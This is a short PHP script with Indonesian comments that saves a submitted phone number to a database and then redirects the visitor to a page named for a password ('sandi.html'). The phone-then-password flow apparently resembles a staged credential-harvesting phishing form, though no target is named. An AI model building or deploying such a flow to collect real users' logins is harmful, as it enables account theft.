<?php
require 'db.php'; // Panggil koneksi database

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = trim($_POST["phone"]); // Ambil input dan hapus spasi

    if (!empty($phone)) {
        $stmt = $conn->prepare("INSERT INTO users (phone) VALUES (?)");
        $stmt->bind_param("s", $phone);

        if ($stmt->execute()) {
            echo "<script>alert('warning'); window.location.href='sandi.html';</script>";
        } else {
            echo "<script>alert('Gagal menyimpan nomor HP!'); window.location.href='phone.html';</script>";
        }

        $stmt->close();
    } else {
        echo "<script>alert('Nomor HP tidak boleh kosong!'); window.location.href='sandi.html';</script>";
    }
}
$conn->close();
?>
